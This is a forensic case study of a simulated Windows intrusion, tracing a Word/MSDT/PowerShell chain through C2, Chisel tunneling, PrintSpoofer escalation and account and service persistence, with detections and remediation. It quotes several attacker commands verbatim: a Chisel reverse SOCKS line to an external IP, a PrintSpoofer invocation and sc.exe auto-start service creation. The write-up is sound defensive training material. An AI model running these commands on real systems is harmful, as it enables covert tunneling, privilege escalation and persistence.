# Multi-Stage Windows Intrusion Investigation

> **Case study:** Simulated Windows incident response | **Focus:** Endpoint forensics, network analysis, privilege escalation, and persistence

## Executive Summary

This case study reconstructs a simulated, multi-stage Windows intrusion using Sysmon, Windows Security events, packet captures, and decoded command-and-control (C2) content. A malicious Word document led to an `msdt.exe` and PowerShell execution chain, followed by payload delivery, a Startup-folder persistence artifact, HTTP C2, host reconnaissance, Chisel reverse SOCKS activity, PrintSpoofer-associated privilege escalation, and local account manipulation. The attacker also issued commands to create automatically starting Windows services.

**Most consequential confirmed outcomes:** creation of the `update.lnk` Startup artifact (Sysmon Event ID 11), decoded output reporting `NT AUTHORITY\SYSTEM`, creation of the local account `shion` (Security Event ID 4720), and its addition to the local Administrators group (Security Event ID 4732). Service-installation commands and Chisel invocation were observed, but successful service installation and tunnel use were **not** independently established.

The goal is to show how an analyst can correlate artifacts, distinguish attempts from verified outcomes, and translate findings into detection and response opportunities.

## Scope, Evidence, and Tools

The investigation examined the initial execution chain, payloads, external communications, discovery commands, escalation, and persistence-related changes on the compromised Windows endpoint. It is based on a **simulated training scenario**, not a production incident or a live containment engagement.

| Source | Investigative use |
| --- | --- |
| Sysmon process and file events | Parent-child relationships, command lines, Startup artifact, attacker tooling |
| Sysmon network events | Outbound connections associated with suspicious processes |
| Windows Security logs | Account creation and local group membership changes |
| Packet captures and decoded HTTP content | Domains, User-Agent, C2 instructions and identity output |
| Script and command output | Credential exposure and host/network discovery |

**Analysis tools:** EvtxECmd, Timeline Explorer, Windows Event Viewer, PowerShell, Wireshark, and Brim.

## Attack Overview

```text
Word document (free_magicules.doc)
  -> WINWORD.EXE -> msdt.exe -> encoded PowerShell
  -> update.zip download / update.lnk in Startup
  -> HTTP C2 and post-compromise commands
  -> credential and service discovery
  -> Chisel reverse SOCKS client invocation
  -> whoami /priv -> PrintSpoofer-associated execution
  -> SYSTEM identity reported in decoded output
  -> local account creation / Administrators membership
  -> attempted automatic Windows service creation
```

This is an **investigative sequence**, not a timestamp-verified event chronology. The following sections link findings to selected artifacts.

## 1. Initial Execution

### Malicious document and MSDT process chain

The initial evidence associated `free_magicules.doc` with Microsoft Word and subsequent suspicious diagnostic-tool and PowerShell activity. The important signal was the *process relationship*—not the mere presence of legitimate Windows utilities.

![Word document execution evidence](evidence/01-malicious-document-execution.png)

*Figure 1 — Process evidence associated with the malicious `free_magicules.doc` document.*

![MSDT and encoded PowerShell](evidence/02-msdt-encoded-powershell.png)

*Figure 2 — `msdt.exe` invocation with PCWDiagnostic parameters and encoded PowerShell content.*

The observed Word/MSDT/PowerShell sequence supported a document-triggered execution assessment. Encoded PowerShell is not inherently malicious, but its execution context and subsequent payload retrieval were suspicious.

## 2. Payload Delivery and Startup Persistence

Decoded PowerShell content showed retrieval of `update.zip` from `phishteam.xyz`, extraction into the user's Windows Startup directory, and deletion of the downloaded archive. A separate Sysmon file-creation event confirmed that `update.lnk` was written there.

![Decoded payload retrieval](evidence/03-powershell-payload-download.png)

*Figure 3 — Decoded PowerShell showing the `update.zip` download and extraction sequence.*

![Startup folder artifact](evidence/04-startup-persistence.png)

*Figure 4 — Sysmon Event ID 11 recording creation of `update.lnk` in a Startup directory.*

Placing a shortcut in Startup creates a potential logon-triggered persistence path. **File creation does not, by itself, prove that the shortcut executed at a later logon.**

## 3. Command and Control

Endpoint telemetry showed repeated outbound connections to `167.71.222.162`. Packet analysis independently identified HTTP requests associated with `resolvecyber.xyz`, including the `Nim httpclient/1.6.6` User-Agent and varying query-string content. This infrastructure was distinguished from the earlier `phishteam.xyz` payload-delivery domain.

![Sysmon outbound connections](evidence/05-sysmon-c2-connections.png)

*Figure 5 — Repeated outbound network connections to `167.71.222.162` in Sysmon telemetry.*

![HTTP C2 traffic](evidence/06-http-c2-traffic.png)

*Figure 6 — Brim HTTP evidence showing requests to `resolvecyber.xyz` and the `Nim httpclient/1.6.6` User-Agent.*

The unusual User-Agent helped identify related requests, but it is client-controlled and does not independently establish the underlying executable or malicious intent. Decoded HTTP command content provided stronger context for the C2 assessment.

## 4. Post-Compromise Discovery

### Decoded C2 instructions

Base64-decoded content from captured HTTP traffic included `whoami` and local-account-related instructions. These showed what was communicated through the channel; a decoded command alone is not proof that it ran successfully on the endpoint.

![Decoded HTTP commands](evidence/07-c2-command-decoding.png)

*Figure 7 — HTTP stream and decoded command content, including `whoami`.*

### Credential material in a script

Investigative output exposed an `automation.ps1` script containing a domain username, a plaintext password assignment, and construction of a PowerShell `PSCredential` object. This was a clear credential-storage weakness; the evidence did not establish every subsequent use of those credentials.

![Credential exposure in script](evidence/08-credential-discovery.png)

*Figure 8 — `automation.ps1` output containing credential configuration. **Redact the plaintext password before publishing.***

### Listening-port enumeration

The attacker also executed `netstat -ano -p tcp`; captured output included listening TCP ports such as 445 and 5985 and their process IDs. This was consistent with discovery of host services potentially useful for later access.

![Listening TCP ports](evidence/09-listening-port-enumeration.png)

*Figure 9 — TCP listening ports and associated process IDs from `netstat` output.*

## 5. Tunneling and Remote Access

Sysmon process telemetry showed `ch.exe` launched by `C:\Users\Public\Downloads\first.exe` with the following Chisel parameters:

```text
"C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks
```

![Chisel invocation](evidence/10-chisel-reverse-socks.png)

*Figure 10 — Chisel client invocation with reverse SOCKS parameters and its parent process.*

The command indicated an attempt to establish a reverse SOCKS path through the compromised endpoint. It **did not independently prove** successful tunnel establishment, traffic relay, or a particular subsequent remote authentication session. Confirming such use would require matching flow and authentication evidence.

## 6. Privilege Escalation

Process evidence showed `whoami /priv` executed to enumerate token privileges. The wider investigation identified `SeImpersonatePrivilege` as relevant, although Figure 11 depicts the enumeration command rather than independently showing its output.

![Privilege enumeration](evidence/11-privilege-enumeration.png)

*Figure 11 — PowerShell-associated `whoami /priv` execution.*

Later telemetry showed `spf.exe`, identified in the investigation as PrintSpoofer, being retrieved and executed with the payload `final.exe`:

```text
spf.exe -c C:\ProgramData\final.exe
```

![PrintSpoofer execution](evidence/12-printspoofer-execution.png)

*Figure 12 — Process evidence for `spf.exe` execution referencing `final.exe`.*

Decoded command output subsequently reported `nt authority\system`.

![SYSTEM identity output](evidence/13-system-access-confirmation.png)

*Figure 13 — Decoded identity output reporting `nt authority\system`.*

Taken together, the tool execution and later identity output support escalation to the SYSTEM context. The exact exploit mechanics were **not** independently reconstructed from low-level telemetry, and the presence of `SeImpersonatePrivilege` alone does not prove exploitation.

## 7. Account Manipulation and Persistence

### Account-management commands

Process evidence showed `net.exe` commands directed at local accounts `shion` and `shuna`, including password modifications and privileged-group changes. The command sequence also included activity affecting the built-in Administrator account. These are **observed commands**, not proof that each requested change succeeded.

![Account manipulation commands](evidence/14-account-manipulation-commands.png)

*Figure 14 — Account-management commands and related post-escalation activity. **Redact every displayed plaintext password before publishing.***

### Confirmed account changes

A Windows Security Event ID **4720** independently confirmed creation of `shion`. A separate Event ID **4732** confirmed addition of `shion` to the built-in Administrators group. The preserved screenshots do not independently confirm every resulting state for `shuna`.

![Local account creation](evidence/15-local-account-creation.png)

*Figure 15 — Security Event ID 4720 confirming creation of `shion`.*

![Administrators group membership](evidence/16-administrator-group-membership.png)

*Figure 16 — Security Event ID 4732 confirming `shion` was added to Administrators.*

Other relevant account-audit events include 4722 (account enabled), 4724 (password-reset attempt), and 4738 (account changed). Interpret each event using its recorded fields rather than presuming that every account-management command succeeded.

### Windows service creation attempts

The attacker also launched `sc.exe` commands targeting `TEMPEST` to request two automatically starting services, both referencing `C:\ProgramData\final.exe`:

```text
sc.exe \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto
sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

![Windows service creation attempts](evidence/17-windows-service-persistence.png)

*Figure 17 — `sc.exe` process evidence requesting automatic service creation for `TempestUpdate` and `TempestUpdate2`.*

These commands demonstrated **attempted service-based persistence**. The preserved material did not independently verify installation, startup, or execution of either service; a service-install event such as Windows System Event ID 7045 or direct service-state evidence would help resolve that question.

**Persistence assessment:** The case includes a confirmed Startup-folder artifact, confirmed creation and elevation of a local account, and observed commands to configure auto-start services. Subsequent use of the account and successful service startup remain unverified.

## Attack Timeline

The entries below are ordered by reconstructed attack progression, **not verified wall-clock timestamps**.

| Phase | Observed activity | Evidence |
| --- | --- | --- |
| Initial execution | `free_magicules.doc` associated with Word → MSDT → encoded PowerShell | Figures 1–2 |
| Payload delivery | Download and extraction of `update.zip` from `phishteam.xyz` | Figure 3 |
| Initial persistence | Creation of `update.lnk` in Startup | Figure 4 |
| C2 | Repeated outbound connections and HTTP activity to `resolvecyber.xyz` | Figures 5–6 |
| Post-compromise commands | Decoded `whoami` and account-related content | Figure 7 |
| Discovery | Credential-bearing script and TCP listening-port enumeration | Figures 8–9 |
| Tunneling | Chisel reverse SOCKS client invoked | Figure 10 |
| Escalation | `whoami /priv` and PrintSpoofer-associated execution | Figures 11–12 |
| Elevated execution | Decoded output reporting SYSTEM identity | Figure 13 |
| Account changes | Account-modification commands; confirmed `shion` creation and Administrators membership | Figures 14–16 |
| Service persistence attempt | Automatic-service creation commands referencing `final.exe` | Figure 17 |

## Key Findings

1. **Document-triggered execution:** A suspicious Word/MSDT/PowerShell process chain initiated the observed intrusion.
2. **Payload delivery and Startup persistence:** Decoded script content showed `update.zip` retrieval, while Sysmon independently recorded `update.lnk` creation in Startup.
3. **HTTP C2:** Network artifacts revealed repeated external communication and encoded command content associated with `resolvecyber.xyz`.
4. **Discovery and credential exposure:** Investigative artifacts showed service enumeration and recoverable authentication material in `automation.ps1`.
5. **Tunneling attempt:** Chisel ran with reverse SOCKS arguments, but successful relay of internal traffic was not verified.
6. **SYSTEM-level activity:** PrintSpoofer-associated execution preceded decoded output reporting the SYSTEM identity.
7. **Privileged account persistence:** Security events confirmed `shion` creation and addition to Administrators; `shuna` was referenced in commands but its resulting state was not fully verified.
8. **Service-based persistence attempt:** `sc.exe` commands requested two auto-start services; installation and startup were not confirmed.

## Investigation Indicators

These are **case-specific investigative leads**, not universally malicious signatures.

### Network

| Indicator | Significance |
| --- | --- |
| `phishteam.xyz` | Second-stage archive delivery |
| `resolvecyber.xyz` | Suspicious HTTP/C2 communications |
| `167.71.222.162` | Destination in repeated Sysmon connections |
| `167.71.199.191:8080` | Remote destination in Chisel command |
| `Nim httpclient/1.6.6` | HTTP User-Agent associated with suspect requests |

### Files, processes, and accounts

| Indicator | Significance |
| --- | --- |
| `free_magicules.doc` | Initial malicious document |
| `update.zip` / `update.lnk` | Downloaded archive / Startup artifact |
| `automation.ps1` | Script exposing credential material |
| `first.exe` / `ch.exe` | Parent executable / Chisel client |
| `spf.exe` / `final.exe` | PrintSpoofer-associated execution / payload |
| `TEMPEST\benimaru` | Domain identity referenced in recovered script material |
| `shion` | Confirmed created account and Administrators member |
| `shuna` | Account targeted by observed commands |
| `TempestUpdate` / `TempestUpdate2` | Service names in attempted installation commands |
| `C:\ProgramData\final.exe` | Executable specified in service-creation commands |

### Relevant telemetry

| Source / Event ID | Detection value |
| --- | --- |
| Sysmon 1 | Process creation, command line, process ancestry |
| Sysmon 3 | Network connections, if enabled |
| Sysmon 11 | File creation, including Startup artifact |
| Security 4720 | Account creation |
| Security 4732 | Local security-enabled group membership change |
| Security 4722 / 4724 / 4738 | Account enablement / password-reset attempt / account change |
| System 7045 | Service installation confirmation **if collected**; not part of the verified evidence here |

## MITRE ATT&CK Mapping

Mappings describe behaviors supported by the preserved artifacts. They are not assertions that every attempted technique succeeded.

| Tactic | Technique | ID | Supporting observation |
| --- | --- | --- | --- |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Encoded PowerShell after Word/MSDT activity |
| Command and Control | Ingress Tool Transfer | `T1105` | External retrieval of `update.zip` |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | `T1547.001` | Startup `update.lnk` creation |
| Command and Control | Application Layer Protocol: Web Protocols | `T1071.001` | Suspicious HTTP C2 traffic |
| Discovery | System Owner/User Discovery | `T1033` | Decoded `whoami` command |
| Discovery | System Network Connections Discovery | `T1049` | `netstat -ano -p tcp` enumeration of listening TCP endpoints |
| Credential Access | Unsecured Credentials: Credentials in Files | `T1552.001` | Credential configuration in `automation.ps1` |
| Command and Control | Proxy | `T1090` | Chisel `R:socks` invocation (attempted) |
| Privilege Escalation | Exploitation for Privilege Escalation | `T1068` | PrintSpoofer-associated execution and later SYSTEM output; exact mechanism not independently validated |
| Persistence | Create Account: Local Account | `T1136.001` | Confirmed creation of `shion` |
| Persistence / Privilege Escalation | Account Manipulation: Additional Local or Domain Groups | `T1098.007` | Confirmed addition to local Administrators |
| Persistence | Create or Modify System Process: Windows Service | `T1543.003` | Attempted creation of two auto-start services |

**Mapping caution:** The `netstat` behavior supports system network connection discovery (`T1049`) more directly than active network service scanning. The Chisel and service rows reflect observed commands, not verified operational outcomes. PrintSpoofer attribution follows the preserved investigation; no specific CVE is asserted.

## Detection Opportunities

| Detection idea | Correlation or signal | Recommended telemetry |
| --- | --- | --- |
| Office-to-utility execution | Office process followed by `msdt.exe` and encoded PowerShell | Sysmon 1; Windows process creation; PowerShell logs |
| Startup artifact creation | Scripted external download followed by a new `.lnk` in Startup | Sysmon 1 and 11; file monitoring |
| Suspicious HTTP C2 | Unexpected client, repeated requests, encoded content, suspicious process ancestry | HTTP proxy/PCAP, DNS, Sysmon 3 |
| Credential discovery | Unusual process or command access to scripts containing hardcoded secrets | PowerShell logs; process and file-access telemetry where enabled |
| Unauthorized tunneling | `ch.exe`, `R:socks`, external endpoint, suspicious parent process | Sysmon 1 and 3; network flow |
| Privilege escalation sequence | `whoami /priv` followed by exploit-related execution and SYSTEM-context processes | Sysmon 1; endpoint detection and response |
| New privileged account | Security 4720 followed by 4732 for the same local identity | Centralized Windows Security logs |
| Suspicious service installation | `sc.exe create` with `start= auto` and unexpected executable path; confirm with 7045 | Sysmon 1; Windows System 7045 |

**Priority correlation:** New local account creation followed shortly by addition of the same identity to Administrators is a comparatively strong, actionable signal. Pair it with host context and change-management records to reduce false positives.

## Remediation Recommendations

These are recommended actions for a comparable incident, **not changes performed in this simulation**.

1. **Contain and preserve evidence.** Isolate the affected endpoint as appropriate; collect volatile information and relevant logs before removing attacker artifacts.
2. **Harden document execution.** Patch Office and Windows; use appropriate attack-surface-reduction rules to prevent unexpected Office child processes and diagnostic-tool abuse.
3. **Reduce unapproved execution.** Apply application control where feasible; monitor encoded PowerShell and downloads into user-writable paths.
4. **Remove persistence safely.** Investigate Startup shortcuts, unauthorized accounts, privileged group changes, and suspect services; preserve forensic evidence before cleanup.
5. **Rotate exposed credentials.** Remove hardcoded secrets from `automation.ps1`-like scripts, rotate affected credentials, and use an approved secrets manager.
6. **Restrict C2 and tunneling opportunities.** Enforce appropriate egress controls, DNS/web filtering, and detection for unapproved proxy/tunnel tools.
7. **Review privilege exposure.** Apply security updates, reduce unnecessary local administrator access, and assess service accounts with impersonation privileges.
8. **Validate recovery.** Review for additional footholds and credential misuse. If endpoint integrity cannot be established, consider rebuilding from a trusted image.
9. **Improve detection coverage.** Centralize process, network, PowerShell, Security, and service-installation logs; validate the proposed account and service correlation rules.

## Evidence Limitations

- **Sequence, not precise timestamps:** The reconstructed timeline follows the supported investigative progression; a timestamp-accurate reconstruction was not available in the selected evidence.
- **Startup persistence:** Sysmon confirmed `update.lnk` creation; a subsequent successful logon-triggered execution was not independently shown.
- **C2:** Decoded instructions and HTTP traffic supported the C2 assessment, but not every message was matched to a successful endpoint command.
- **Credential exposure:** `automation.ps1` exposed credential material; subsequent use of that credential was not independently proven.
- **Reverse SOCKS:** Chisel process arguments showed an attempted tunnel; successful connection and internal traffic relay were not established.
- **Privilege escalation:** Tool execution and reported SYSTEM identity supported escalation; low-level exploit mechanics were not reconstructed.
- **Account activity:** Events confirmed `shion` creation and Administrators membership. Commands involving `shuna` and password changes do not independently prove all resulting account states.
- **Service persistence:** `sc.exe` creation commands were observed, but the selected evidence did not include independent verification of service installation or startup.
- **Credential hygiene:** Published screenshots must have all plaintext passwords and any other reusable secrets irreversibly redacted before commit.

## Skills Demonstrated

- **Endpoint forensics:** Sysmon process ancestry, file creation, Windows Security event correlation, command-line reconstruction.
- **Network investigation:** Wireshark/Brim HTTP analysis, C2 indicators, User-Agent review, encoded command interpretation.
- **Intrusion analysis:** Office/MSDT/PowerShell execution, credential exposure, Chisel tunneling, PrintSpoofer-associated escalation, persistence mechanisms.
- **SOC analysis:** Evidence-based attack timeline, ATT&CK mapping, detection engineering opportunities, scoped conclusions, remediation planning.

---

*This report documents analysis of a simulated intrusion using preserved training artifacts. It is an investigative case study, not a record of actions performed against a live target.*
